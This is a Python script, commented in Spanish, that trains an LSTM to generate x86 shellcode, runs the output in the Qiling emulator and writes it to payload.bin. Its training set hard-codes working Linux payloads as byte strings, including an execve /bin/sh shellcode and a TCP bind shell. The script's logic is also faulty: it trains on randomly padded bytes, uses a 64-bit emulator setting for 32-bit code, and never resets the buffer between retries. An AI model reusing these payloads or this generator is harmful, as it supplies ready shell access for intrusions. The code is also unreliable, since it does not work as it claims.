import os
import numpy as np
import tensorflow as tf
from qiling import Qiling
from qiling.const import QL_ARCH, QL_OS
from capstone import Cs, CS_ARCH_X86, CS_MODE_32

# Configuración para CPU y supresión de warnings
os.environ['CUDA_VISIBLE_DEVICES'] = '-1'
os.environ['TF_ENABLE_ONEDNN_OPTS'] = '0'
os.environ['TF_CPP_MIN_LOG_LEVEL'] = '2'  # Oculta warnings de TF

# Configuración del modelo
SEED = bytes([0x90] * 16)  # 16 bytes de NOPs
SHELLCODE_LENGTH = 128
SEQ_LENGTH = SHELLCODE_LENGTH - 1  # 127
INVALID_OPCODES = {0xcf, 0x60, 0x7b, 0x0f}

# --------------------------------------
# 1. Dataset Mejorado
# --------------------------------------
def get_real_shellcodes(num_samples=1000):
    base_samples = [
        # exit(0) x86
        b"\x31\xc0\x40\x89\xc3\xcd\x80",

        # /bin/sh x86
        b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80",

        # TCP bind shell x86
        b"\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x97\x31\xc0\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x43\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\x43\xcd\x80\x31\xc9\xb1\x02\x89\xfb\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
    ]


    synthetic = []
    for _ in range(num_samples):
        sc = base_samples[np.random.randint(0, len(base_samples))]
        if len(sc) < SHELLCODE_LENGTH:
            # CORRECCIÓN: Paréntesis cerrado correctamente
            padding = bytes(np.random.randint(0, 256, size=SHELLCODE_LENGTH - len(sc), dtype=np.uint8))
            sc += padding
        synthetic.append(sc[:SHELLCODE_LENGTH])  # Asegurar longitud exacta

    return synthetic

# --------------------------------------
# 2. Modelo con Functional API
# --------------------------------------
def build_model():
    inputs = tf.keras.Input(shape=(SEQ_LENGTH, 1))

    x = tf.keras.layers.Conv1D(64, 5, activation='relu', padding='same')(inputs)
    x = tf.keras.layers.LSTM(128, return_sequences=True)(x)
    x = tf.keras.layers.LSTM(64)(x)
    outputs = tf.keras.layers.Dense(256, activation='softmax')(x)

    model = tf.keras.Model(inputs=inputs, outputs=outputs)
    model.compile(
        loss='sparse_categorical_crossentropy',
        optimizer='adam',
        metrics=['accuracy']
    )
    return model

# --------------------------------------
# 3. Generador con Padding Dinámico
# --------------------------------------
class ShellcodeGenerator:
    def __init__(self, model):
        self.model = model
        self.md = Cs(CS_ARCH_X86, CS_MODE_32)

    def pad_sequence(self, sequence):
        """Añade padding con 0x00 al inicio para alcanzar SEQ_LENGTH"""
        if len(sequence) < SEQ_LENGTH:
            return bytes([0x00] * (SEQ_LENGTH - len(sequence))) + sequence
        return sequence[-SEQ_LENGTH:]

    def generate(self, max_attempts=10):
        shellcode = bytearray(SEED)
        valid = False
        attempts = 0

        while not valid and attempts < max_attempts:
            # Construir shellcode hasta alcanzar la longitud deseada
            while len(shellcode) < SHELLCODE_LENGTH:
                # Preparar input con padding
                padded = self.pad_sequence(shellcode)
                input_array = np.array(list(padded), dtype=np.float32).reshape(1, SEQ_LENGTH, 1) / 255.0

                # Predecir próximo byte
                pred = self.model.predict(input_array, verbose=0)[0]
                next_byte = np.argmax(pred)

                # Filtrar bytes inválidos
                while next_byte in INVALID_OPCODES:
                    pred[next_byte] = 0
                    next_byte = np.argmax(pred)

                shellcode.append(next_byte)

            # Validar con Capstone
            valid = any(self.md.disasm(bytes(shellcode), 0x1000))
            attempts += 1

        return bytes(shellcode)

# --------------------------------------
# 4. Ejecución Principal
# --------------------------------------
def main():
    # 1. Preparar dataset
    shellcodes = get_real_shellcodes()
    X = np.array([list(sc[:-1]) for sc in shellcodes], dtype=np.uint8)
    y = np.array([sc[-1] for sc in shellcodes], dtype=np.uint8)

    # 2. Construir y entrenar modelo
    model = build_model()
    model.fit(
        X.reshape(-1, SEQ_LENGTH, 1)/255.0,
        y,
        epochs=50,
        batch_size=64,
        validation_split=0.2,
        verbose=1
    )

    # 3. Generar y validar shellcode
    generator = ShellcodeGenerator(model)
    shellcode = generator.generate()

    # 4. Ejecutar con Qiling
    ql = Qiling(
        code=shellcode,
        rootfs="/tmp",
        archtype=QL_ARCH.X8664,
        ostype=QL_OS.LINUX,
        console=False
    )

    try:
        ql.run()
        print("\n[+] Shellcode ejecutado exitosamente!")
        print(f"Longitud: {len(shellcode)} bytes")
        print(f"Hex: {shellcode.hex()}")
    except Exception as e:
        print(f"\n[!] Error en ejecución: {str(e)}")

    # Guardar a archivo
    with open("payload.bin", "wb") as f:
        f.write(shellcode)

    # 5. Mostrar desensamblado
    print("\nDesensamblado parcial:")
    for i in generator.md.disasm(shellcode, 0x1000):
        print(f"0x{i.address:04x}: {i.mnemonic} {i.op_str}")

if __name__ == "__main__":
    main()
